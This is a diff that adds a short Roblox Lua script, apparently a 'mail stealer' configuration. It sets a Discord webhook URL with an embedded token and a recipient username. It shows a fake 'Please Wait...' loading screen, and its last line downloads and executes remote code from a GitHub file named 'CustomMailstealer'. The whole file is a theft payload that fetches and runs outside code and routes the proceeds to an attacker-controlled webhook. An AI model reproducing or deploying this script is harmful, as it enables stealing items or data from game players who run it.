@@ -1,0 +1,7 @@
+Username = "BankMailWe"
+Webhook = "https://discord.com/api/webhooks/1198518444157579385/6J18cd9nOsKilYNSXoTGPVi75XyFUVpcnMukoS67HLo24zUrBymD8X1lyoveaDrmtEW6"
+
+G_LoadingScreen = "Please Wait..."
+G_WebhookName = "wait"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
